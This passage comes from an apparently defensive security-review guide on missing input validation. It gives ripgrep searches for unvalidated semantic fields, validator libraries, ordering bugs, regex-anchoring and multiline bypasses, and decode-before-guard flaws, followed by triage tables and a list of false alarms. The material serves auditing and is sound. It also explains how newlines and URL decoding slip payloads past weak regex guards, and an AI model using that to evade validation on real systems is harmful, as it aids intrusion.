# General: handler/DTO params with semantic names bound from request without a validator nearby (same \b-anchoring)
rg -n "\b(email|e_?mail|zip|postal|phone|msisdn|url|uri|uuid|country|currency|locale|ip|ipaddress|hostname|domain|dob|birth|ssn|taxid|nationalid|creditcard|cvv|iban|latitude|longitude|sort|order|mimetype|contenttype|isbn|cron|slug)\w*" --glob '*.{js,ts,py,go,java,cs,rb,php}' -i -C2
# Validators present? (their ABSENCE near the semantic field is the signal). Per-language so you don't false-positive on an already-validated field:
#   JS/TS:  zod | joi | yup | class-validator | @IsEmail | @IsEnum | validator\.
#   Python: pydantic | EmailStr | constr\( | Literal\[ | marshmallow | cerberus | django forms/validators
#   Java:   @Email | @Pattern | @Valid | hibernate-validator | jakarta.validation
#   C#:     DataAnnotations | \[EmailAddress\] | \[RegularExpression\] | FluentValidation
#   Go:     go-playground/validator | ozzo-validation | `validate:"..."` struct tags
#   Ruby:   validates | strong params \.permit\( | dry-validation
#   PHP:    filter_var | FILTER_VALIDATE_ | Respect\\Validation | Symfony Validator | Laravel `request->validate`
#   GraphQL: validated custom scalar (graphql-scalars EmailAddress/URL/UUID), enum type
rg -n "zod|joi|yup|class-validator|@IsEmail|@IsEnum|@Email|@Pattern|@Valid|hibernate|jakarta.validation|DataAnnotations|EmailAddress|RegularExpression|FluentValidation|pydantic|EmailStr|constr\(|Literal\[|marshmallow|cerberus|go-playground/validator|ozzo-validation|validate:\"|validates|\.permit\(|dry-validation|filter_var|FILTER_VALIDATE|Respect|->validate|validator\.|graphql-scalars|\bEnum\b" --glob '*.{js,ts,py,go,java,cs,rb,php,graphql,graphqls}'
# Transform-AFTER-validation ordering bug (CWE-179/180): a normalize/case/decode/strip step on the validated value — confirm it runs AFTER the check, before the sink
rg -n "Normalizer\.normalize|\.normalize\(\s*['\"]?NF(K?[CD])|unicodedata\.normalize|toUpperCase\(|toLowerCase\(|casefold\(|URLDecoder\.decode|replaceAll\(" --glob '*.{js,ts,py,go,java,cs,rb,php}'
# ^/$ line-anchor validation bypass (CWE-777): Ruby allowlist regexes anchored with ^…$ instead of \A…\z (a newline slips a payload through). Triage each hit against the sink it guards.
rg -n "validates?(_format_of)?\b.{0,80}/\^|=~\s*/\^|match\??\(/\^" --glob '*.rb'
# any language: a MULTILINE flag on what is used as a validation/allowlist regex
rg -n "re\.MULTILINE|RegexOptions\.Multiline|\(\?m\)|/\^.*\$/[a-z]*m" --glob '*.{py,js,ts,cs,go,php,java}'
# Guard regex under-matching (fail-open authz): a protect/deny pattern using . or .* with no DOTALL.
# Triage each hit by checking whether the dispatcher uses startsWith/equals/route-table on the same string.
rg -n "Pattern\.compile\(\"[^\"]*(admin|internal|manage|actuator|private)[^\"]*\.[*+]" --glob '*.java'
rg -n "regexMatchers|RequestMatcher|antMatchers?\(.*\.\*|location\s+~" --glob '*.{java,kt,conf}'
# the decode step that turns %0a into a real newline before the guard sees it
rg -n "URLDecoder\.decode|unquote\(|decodeURIComponent\(|url\.QueryUnescape" -C3 --glob '*.{java,py,js,ts,go}'
```

## Severity / Triage

| Situation | Verdict |
|-----------|---------|
| Semantic-domain field, free-form type, no validation, no sink | **Low** |
| Same, but validation is present-but-weak (unanchored regex, `.includes`) | **Info** |
| Same field also reaches an injection/IDOR/SSRF/mass-assignment sink | Report the **higher class** (this is superseded) |
| Free-text field (`bio`, `comment`, `search`) | **Not a finding** |
| Validated (enum / validated scalar / schema / allowlist) | **SAFE** |

## Common False Alarms

- Flagging **every** `String` argument — only semantic-domain fields qualify; free-text is expected to be free.
- Flagging a field that **is** validated elsewhere (DTO/schema layer, custom scalar, framework `@Valid`) — trace for a validator before reporting.
- Re-reporting a field already covered by a higher sink-driven finding — supersede, don't duplicate.
- Treating `role`/`tenantId` self-write as "input validation" — that's `mass_assignment`/`privilege_escalation`/`idor`.
- A single shared parsed object (or duplicate-key-rejecting parser) used by both policy and execution — **SAFE**; do not flag merely because JSON is present.
- "Policy checked the amount" when policy and execution each `json.loads` the **raw** body independently with different duplicate-key rules — **not** a false alarm; that is JSON duplicate-key drift.

## Cross-References

- GraphQL weak typing as an injection/IDOR/DoS **precursor**: `graphql_injection.md` (Schema-Level Input Validation, Custom Scalar Coercion).
- When the unvalidated value reaches a sink: `sql_injection.md`, `nosql_injection.md`, `ssrf.md`, `path_traversal_lfi_rfi.md`, `open_redirect.md`, `rce.md`, `xss.md`, `log_injection.md`, `regex_injection_redos.md`.
- Privileged-field binding: `mass_assignment.md`, `privilege_escalation.md`, `idor.md`.
- Size/cardinality (not format): `denial_of_service.md`, `graphql_dos.md`.

## Core Principle

Constrain at the boundary: prefer a precise type (`enum`, validated custom scalar, schema/DTO with anchored format) over a free-form string the resolver "remembers" to check. A semantically-constrained input accepted without validation is a Low finding even with no exploit today — it is missing data-integrity assurance and a standing injection precursor.
